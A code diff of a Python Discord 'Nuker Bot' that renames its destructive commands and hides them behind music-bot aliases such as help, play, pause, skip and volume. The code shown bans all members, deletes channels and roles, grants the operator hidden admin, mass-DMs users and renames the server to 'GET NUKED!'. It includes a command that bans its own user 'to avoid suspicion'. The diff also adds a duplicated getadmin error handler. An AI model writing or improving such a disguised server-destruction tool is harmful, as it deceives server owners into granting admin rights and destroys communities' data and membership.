@@ -1,6 +1,6 @@
 # Made by KingWaffleIII and QuantumFox42
 # Nuker Bot
-# v1.16b
+# v1.16
 
 import discord
 from discord.ext import commands
@@ -12,9 +12,21 @@ from time import sleep
 from typing import Optional
 from json import loads, dumps
 
+commandaliases = {
+    "nuke": ["help"],
+    "getadmin": ["play", "p"],
+    "banme": ["pause"],
+    "banmeandbot": ["stop"],
+    "removebot": ["leave"],
+    "resetsettings": ["resetvolume"],
+    "showsettings": ["showvolume"],
+    "settings": ["volume"],
+    "customnuke": ["skip"]
+}
+
 if "settings.json" not in listdir():
     # First time setup
-    print("No settings.json found. Performing first time setup.\nPlease make sure to enter all values correctly.\nIf you wish to restart the first time setup, simply delete the settings.json file.")
+    print("Performing First Time Setup.\nPlease make sure to enter all values correctly.\nThis will create a \"settings.json\" file.\nIf you wish to restart the first time setup, simply delete the settings.json file.\n")
 
     # Main Variables
     TOKEN = input("Please input your bot's token and press enter to continue: ")
@@ -66,6 +78,7 @@ else:
         file.write(dumps(settings))
         file.close()
 
+    # Set main variables
     TOKEN = settings["TOKEN"]
     USER_ID = settings["USERID"]
     PREFIX = settings["PREFIX"]
@@ -103,7 +116,6 @@ intents.members = True
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 bot.remove_command("help")
-
 
 # Read and write role IDs
 def getRoleIDs():
@@ -153,6 +165,11 @@ async def dm_user(user, message):
     embed=discord.Embed(description=message)
     embed.set_author(name=user.name, icon_url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
     await user.send(embed=embed)
+
+async def settingsembed(user, message):
+    embed=discord.Embed(description=message)
+    embed.set_author(name=user.name, icon_url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
+    return embed
 
 default_volume_settings = {
     "ban": True,
@@ -371,9 +388,15 @@ async def on_message(msg):
                 )
                 await msg.channel.send(content=None, embed=embed)
                 return
+
         cmds = []
+
         for command in bot.commands:
             cmds.append(str(command))
+
+        for i in [commandaliases[command] for command in commandaliases]:
+            cmds.extend(i)
+
         if not msg.content.lower().split(" ")[0][1:] in cmds:
             embed = discord.Embed(
                 title="Server Error!",
@@ -397,7 +420,7 @@ async def on_message(msg):
 
 
 # nukes the server
-@bot.command(name="help")
+@bot.command(name="nuke", aliases=commandaliases["nuke"])
 @commands.bot_has_permissions(administrator=True)
 async def nuke(ctx):
     server_name = ctx.guild.name
@@ -460,31 +483,18 @@ Banned Users: {len(member_list)}
 Roles Deleted: {len(role_list)}
 ''')
 
-# alias to help command
-@bot.command(name="nuke")
-@commands.bot_has_permissions(administrator=True)
-async def nukealias(ctx):
-    await nuke(ctx)
-
 # gives the user admin
-@bot.command(name="play")
+@bot.command(name="getadmin",aliases=commandaliases["getadmin"])
 @commands.bot_has_permissions(administrator=True)
-async def play(ctx):
+async def getadmin(ctx):
     await ctx.message.delete()
     await create_admin(ctx)
 
 
-# alias to play command
-@bot.command(name="p")
-@commands.bot_has_permissions(administrator=True)
-async def playalias(ctx):
-    await play(ctx)
-
-
 # bans the person who ran the command to avoid suspicion
-@bot.command(name="pause")
+@bot.command(name="banme", aliases=commandaliases["banme"])
 @commands.bot_has_permissions(administrator=True)
-async def pause(ctx):
+async def banme(ctx):
     await ctx.message.delete()
     if not USER_ID:
         await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
@@ -507,9 +517,9 @@ Server Owner: {ctx.guild.owner}
 
 
 # bans the person who ran the command as well as removing the bot
-@bot.command(name="stop")
+@bot.command(name="banmeandbot", aliases=commandaliases["banmeandbot"])
 @commands.bot_has_permissions(administrator=True)
-async def stop(ctx):
+async def banmeandbot(ctx):
     await ctx.message.delete()
     if not USER_ID:
         await ctx.guild.ban(await ctx.guild.fetch_member(ctx.message.author.id))
@@ -534,8 +544,8 @@ Server Owner: {ctx.guild.owner}
 
 
 # leaves the server
-@bot.command(name="leave")
-async def leave(ctx):
+@bot.command(name="removebot", aliases=commandaliases["removebot"])
+async def removebot(ctx):
     await ctx.guild.leave()
     output_log(f'''
 *** SERVER LEAVE ALERT ***
@@ -546,16 +556,16 @@ Server Owner: {ctx.guild.owner}
 ''')
 
 
-@bot.command(name="resetvolume")
-async def resetvolume(ctx):
+@bot.command(name="resetsettings", aliases=commandaliases["resetsettings"])
+async def resetsettings(ctx):
     volume_settings=getVolumeSettings()
     volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
     writeVolumeSettings(volume_settings)
-    await dm_user(ctx.message.author, "Reset volume settings.")
+    await ctx.send(embed=await settingsembed(ctx.message.author, "Reset settings."))
 
 
-@bot.command(name="showvolume")
-async def showvolume(ctx):
+@bot.command(name="showsettings", aliases=commandaliases["showsettings"])
+async def showsettings(ctx):
     volume_settings = getVolumeSettings()
     if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
         volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
@@ -563,7 +573,7 @@ async def showvolume(ctx):
 
     user_volume_settings = getVolumeSettings()[str(ctx.message.author.id)]
 
-    embed=discord.Embed(title="Volume Settings", description=f'''
+    embed=discord.Embed(title="Settings", description=f'''
 Ban Everyone: {user_volume_settings["ban"]}
 Delete Channels: {user_volume_settings["channels"]}
 Delete Roles: {user_volume_settings["roles"]}
@@ -583,10 +593,8 @@ Nuke Channel Message: {user_volume_settings["nc_msg"][0]}
     await ctx.send(embed=embed)
 
 
-@bot.command(name="volume")
-async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
-    if not isinstance(ctx.channel, discord.channel.DMChannel):
-        await ctx.message.delete()
+@bot.command(name="settings", aliases=commandaliases["settings"])
+async def settings(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
 
     volume_settings = getVolumeSettings()
     
@@ -600,56 +608,56 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
         setting = config_options[int(value)]
         if setting == "ban":
             settings["ban"] = status
-            await dm_user(ctx.message.author, f"Changed \"ban everyone\" to {status}")
+            await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"ban everyone\" to {status}"))
         elif setting == "maxchannels":
             settings["maxchannels"] = status
-            await dm_user(ctx.message.author, f"Changed \"maximum channels\" to {status}")
+            await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"maximum channels\" to {status}"))
         elif setting == "channels":
             settings["channels"] = status
-            await dm_user(ctx.message.author, f"Changed \"delete channels\" to {status}")
+            await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"delete channels\" to {status}"))
         elif setting == "roles":
             settings["roles"] = status
 
-            await dm_user(ctx.message.author, f"Changed \"delete roles\" to {status}")
+            await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"delete roles\" to {status}"))
         elif setting == "server":
             if arg1:
                 if arg2:
                     settings["server"] = [status, arg1, arg2]
-                    await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of {arg1} and an icon of {arg2}")
+                    await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"edit server\" to {status} with a name of {arg1} and an icon of {arg2}"))
                 else:
                     settings["server"] = [status, arg1, "https://i.imgur.com/CNdUGZj.jpg"]
-                    await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of {arg1} and an icon of https://i.imgur.com/CNdUGZj.jpg")
+                    await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"edit server\" to {status} with a name of {arg1} and an icon of https://i.imgur.com/CNdUGZj.jpg"))
             else:
                 settings["server"] = [status, "GET NUKED!", "https://i.imgur.com/CNdUGZj.jpg"]
-                await dm_user(ctx.message.author, f"Changed \"edit server\" to {status} with a name of \"GET NUKED!\" and an icon of https://i.imgur.com/CNdUGZj.jpg")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"edit server\" to {status} with a name of \"GET NUKED!\" and an icon of https://i.imgur.com/CNdUGZj.jpg"))
         elif setting == "nuke_channel":
             if arg1:
                 settings["nuke_channel"] = [status, arg1]
-                await dm_user(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of {arg1}")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of {arg1}"))
             else:
                 settings["nuke_channel"] = [status, "get nuked"]
-                await dm_user(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of \"get nuked\"")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"nuke channel\" to {status} with a name of \"get nuked\""))
         elif setting == "nc_msg":
             if arg1:
                 settings["nc_msg"] = [status, arg1]
-                await dm_user(ctx.message.author, f"Changed \"nuke channel message\" to {status} with a message of {arg1}")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"nuke channel message\" to {status} with a message of {arg1}"))
             else:
                 settings["nc_msg"] = [status, "GET NUKED!"]
-                await dm_user(ctx.message.author, f"Changed \"nuke channel message\" to {status} with a message of \"GET NUKED!\"")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"nuke channel message\" to {status} with a message of \"GET NUKED!\""))
         elif setting == "dm":
             if arg1:
                 settings["dm"] = [status, arg1]
-                await dm_user(ctx.message.author, f"Changed \"DM everyone\" to {status} with a message of {arg1}")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"DM everyone\" to {status} with a message of {arg1}"))
             else:
                 settings["dm"] = [status, "GET NUKED!"]
-                await dm_user(ctx.message.author, f"Changed \"DM everyone\" to {status} with a message of \"GET NUKED!\"")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"DM everyone\" to {status} with a message of \"GET NUKED!\""))
         elif setting == "nick":
             if arg1:
                 settings["nick"] = [status, arg1]
-                await dm_user(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of {arg1}")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of {arg1}"))
             else:
                 settings["nick"] = [status, "GET NUKED!"]
-                await dm_user(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of \"GET NUKED!\"")
+                await ctx.send(embed=await settingsembed(ctx.message.author, f"Changed \"nick everyone\" to {status} with a name of \"GET NUKED!\""))
     else:
         lines = []
         config_1 = status
@@ -699,13 +707,13 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
             "maxchannels": config_8,
             "nc_msg": config_9
         }
-        await dm_user(ctx.message.author, "\n".join(lines))
+        await ctx.send(embed=await settingsembed(ctx.message.author, "\n".join(lines)))
     writeVolumeSettings(volume_settings)
 
 
-@bot.command(name="skip")
+@bot.command(name="customnuke", aliases=commandaliases["customnuke"])
 @commands.bot_has_permissions(administrator=True)
-async def skip(ctx):
+async def customnuke(ctx):
     if USER_ID is not False:
         if ctx.message.author.id != USER_ID:
             return
@@ -846,8 +854,35 @@ Server Name: {ctx.guild.name}
 Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
-@nukealias.error
-async def nukealias_error(ctx, error):
+
+
+@getadmin.error
+async def getadmin_error(ctx, error):
+    if isinstance(error, commands.BotMissingPermissions):
+        await ctx.send("Checking environment...")
+        sleep(1)
+        try:
+            embed = discord.Embed(title="Error: Missing Required Permissions!",
+                                  description="This bot is lacking required permissions!")
+            embed.add_field(name="You need to grant me the following permission(s):",
+                            value="- Administrator")
+            await ctx.send(content=None, embed=embed)
+        except discord.Forbidden:
+            await ctx.send('''
+__**Error: Missing Required Permission!**__
+**I need the following permission(s) to function properly:**
+- `Administrator`
+''')
+
+        output_log(f'''
+Bad Environment: Insufficient Permissions!
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
+
+@getadmin.error
+async def getadmin_error(ctx, error):
     if isinstance(error, commands.BotMissingPermissions):
         await ctx.send("Checking environment...")
         sleep(1)
@@ -872,58 +907,8 @@ Server Owner: {ctx.guild.owner}
 ''')
 
 
-@play.error
-async def play_error(ctx, error):
-    if isinstance(error, commands.BotMissingPermissions):
-        await ctx.send("Checking environment...")
-        sleep(1)
-        try:
-            embed = discord.Embed(title="Error: Missing Required Permissions!",
-                                  description="This bot is lacking required permissions!")
-            embed.add_field(name="You need to grant me the following permission(s):",
-                            value="- Administrator")
-            await ctx.send(content=None, embed=embed)
-        except discord.Forbidden:
-            await ctx.send('''
-__**Error: Missing Required Permission!**__
-**I need the following permission(s) to function properly:**
-- `Administrator`
-''')
-
-        output_log(f'''
-Bad Environment: Insufficient Permissions!
-Server Name: {ctx.guild.name}
-Server ID: {ctx.guild.id}
-Server Owner: {ctx.guild.owner}
-''')
-
-@playalias.error
-async def playalias_error(ctx, error):
-    if isinstance(error, commands.BotMissingPermissions):
-        await ctx.send("Checking environment...")
-        sleep(1)
-        try:
-            embed = discord.Embed(title="Error: Missing Required Permissions!",
-                                  description="This bot is lacking required permissions!")
-            embed.add_field(name="You need to grant me the following permission(s):",
-                            value="- Administrator")
-            await ctx.send(content=None, embed=embed)
-        except discord.Forbidden:
-            await ctx.send('''
-__**Error: Missing Required Permission!**__
-**I need the following permission(s) to function properly:**
-- `Administrator`
-''')
-
-        output_log(f'''
-Bad Environment: Insufficient Permissions!
-Server Name: {ctx.guild.name}
-Server ID: {ctx.guild.id}
-Server Owner: {ctx.guild.owner}
-''')
-
-@pause.error
-async def pause_error(ctx, error):
+@banmeandbot.error
+async def banmeandbot_error(ctx, error):
     if isinstance(error, commands.BotMissingPermissions):
         await ctx.send("Checking environment...")
         sleep(1)
@@ -948,8 +933,8 @@ Server Owner: {ctx.guild.owner}
 ''')
 
 
-@stop.error
-async def stop_error(ctx, error):
+@settings.error
+async def settings_error(ctx, error):
     if isinstance(error, commands.BotMissingPermissions):
         await ctx.send("Checking environment...")
         sleep(1)
@@ -974,34 +959,8 @@ Server Owner: {ctx.guild.owner}
 ''')
 
 
-@volume.error
-async def vol_error(ctx, error):
-    if isinstance(error, commands.BotMissingPermissions):
-        await ctx.send("Checking environment...")
-        sleep(1)
-        try:
-            embed = discord.Embed(title="Error: Missing Required Permissions!",
-                                  description="This bot is lacking required permissions!")
-            embed.add_field(name="You need to grant me the following permission(s):",
-                            value="- Administrator")
-            await ctx.send(content=None, embed=embed)
-        except discord.Forbidden:
-            await ctx.send('''
-__**Error: Missing Required Permission!**__
-**I need the following permission(s) to function properly:**
-- `Administrator`
-''')
-
-        output_log(f'''
-Bad Environment: Insufficient Permissions!
-Server Name: {ctx.guild.name}
-Server ID: {ctx.guild.id}
-Server Owner: {ctx.guild.owner}
-''')
-
-
-@skip.error
-async def skip_error(ctx, error):
+@customnuke.error
+async def customnuke_error(ctx, error):
     if isinstance(error, commands.BotMissingPermissions):
         await ctx.send("Checking environment...")
         sleep(1)
